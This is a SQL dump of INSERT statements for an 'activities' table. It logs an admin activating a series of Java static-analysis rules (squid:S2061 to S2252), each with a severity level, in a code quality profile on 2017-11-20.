INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3637, '2017-11-20 12:53:46.924', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2061;ruleKey=squid:S2061;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeMsbbGRdfPp-rWZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3638, '2017-11-20 12:53:46.96', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2062;ruleKey=squid:S2062;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeNQbbGRdfPp-rWa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3639, '2017-11-20 12:53:47.005', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2065;ruleKey=squid:S2065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeN9bbGRdfPp-rWb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3640, '2017-11-20 12:53:47.051', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2066;ruleKey=squid:S2066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeOrbbGRdfPp-rWc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3641, '2017-11-20 12:53:47.113', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfePpbbGRdfPp-rWd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3642, '2017-11-20 12:53:47.177', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeQpbbGRdfPp-rWe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3643, '2017-11-20 12:53:47.238', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeRmbbGRdfPp-rWf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3644, '2017-11-20 12:53:47.312', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeSwbbGRdfPp-rWg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3645, '2017-11-20 12:53:47.377', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeTxbbGRdfPp-rWh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3646, '2017-11-20 12:53:47.408', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeUQbbGRdfPp-rWi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3647, '2017-11-20 12:53:47.438', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeUubbGRdfPp-rWj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3648, '2017-11-20 12:53:47.471', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeVPbbGRdfPp-rWk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3649, '2017-11-20 12:53:47.503', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeVvbbGRdfPp-rWl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3650, '2017-11-20 12:53:47.522', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeWCbbGRdfPp-rWm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3651, '2017-11-20 12:53:47.553', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeWgbbGRdfPp-rWn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3652, '2017-11-20 12:53:47.581', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeW9bbGRdfPp-rWo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3653, '2017-11-20 12:53:47.602', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeXSbbGRdfPp-rWp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3654, '2017-11-20 12:53:47.641', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeX5bbGRdfPp-rWq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3655, '2017-11-20 12:53:47.663', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeYPbbGRdfPp-rWr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3656, '2017-11-20 12:53:47.692', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeYsbbGRdfPp-rWs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3657, '2017-11-20 12:53:47.716', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeZEbbGRdfPp-rWt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3658, '2017-11-20 12:53:47.744', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeZgbbGRdfPp-rWu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3659, '2017-11-20 12:53:47.775', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeZ_bbGRdfPp-rWv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3660, '2017-11-20 12:53:47.804', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeacbbGRdfPp-rWw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3661, '2017-11-20 12:53:47.835', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfea7bbGRdfPp-rWx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3662, '2017-11-20 12:53:47.866', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfebabbGRdfPp-rWy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3663, '2017-11-20 12:53:47.897', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfeb4bbGRdfPp-rWz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3664, '2017-11-20 12:53:47.919', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfecPbbGRdfPp-rW0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3665, '2017-11-20 12:53:47.948', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfecsbbGRdfPp-rW1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3666, '2017-11-20 12:53:47.988', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfedUbbGRdfPp-rW2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3667, '2017-11-20 12:53:48.056', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeeYbbGRdfPp-rW3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3668, '2017-11-20 12:53:48.109', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfefNbbGRdfPp-rW4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3669, '2017-11-20 12:53:48.208', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfegwbbGRdfPp-rW5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3670, '2017-11-20 12:53:48.253', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfehdbbGRdfPp-rW6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3671, '2017-11-20 12:53:48.323', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeijbbGRdfPp-rW7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3672, '2017-11-20 12:53:48.347', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfei7bbGRdfPp-rW8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3673, '2017-11-20 12:53:48.367', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfejPbbGRdfPp-rW9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3674, '2017-11-20 12:53:48.391', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfejnbbGRdfPp-rW-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3675, '2017-11-20 12:53:48.415', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfej_bbGRdfPp-rW_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3676, '2017-11-20 12:53:48.441', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfekZbbGRdfPp-rXA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3677, '2017-11-20 12:53:48.479', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfek_bbGRdfPp-rXB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3678, '2017-11-20 12:53:48.505', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfelZbbGRdfPp-rXC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3679, '2017-11-20 12:53:48.531', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfelzbbGRdfPp-rXD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3680, '2017-11-20 12:53:48.548', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfemEbbGRdfPp-rXE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3681, '2017-11-20 12:53:48.573', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfemdbbGRdfPp-rXF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3682, '2017-11-20 12:53:48.597', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfem1bbGRdfPp-rXG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3683, '2017-11-20 12:53:48.632', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfenYbbGRdfPp-rXH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3684, '2017-11-20 12:53:48.65', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfenqbbGRdfPp-rXI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3685, '2017-11-20 12:53:48.675', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeoDbbGRdfPp-rXJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3686, '2017-11-20 12:53:48.701', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeodbbGRdfPp-rXK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3687, '2017-11-20 12:53:48.72', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeowbbGRdfPp-rXL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3688, '2017-11-20 12:53:48.747', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfepLbbGRdfPp-rXM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3689, '2017-11-20 12:53:48.777', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeppbbGRdfPp-rXN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3690, '2017-11-20 12:53:48.805', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeqFbbGRdfPp-rXO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3691, '2017-11-20 12:53:48.836', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeqkbbGRdfPp-rXP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3692, '2017-11-20 12:53:48.864', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZferAbbGRdfPp-rXQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3693, '2017-11-20 12:53:48.889', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZferZbbGRdfPp-rXR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3694, '2017-11-20 12:53:48.916', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfer0bbGRdfPp-rXS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3695, '2017-11-20 12:53:48.933', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfesFbbGRdfPp-rXT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3696, '2017-11-20 12:53:48.958', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfesebbGRdfPp-rXU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3697, '2017-11-20 12:53:48.99', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfes-bbGRdfPp-rXV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3698, '2017-11-20 12:53:49.02', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfetcbbGRdfPp-rXW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3699, '2017-11-20 12:53:49.067', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeuLbbGRdfPp-rXX');
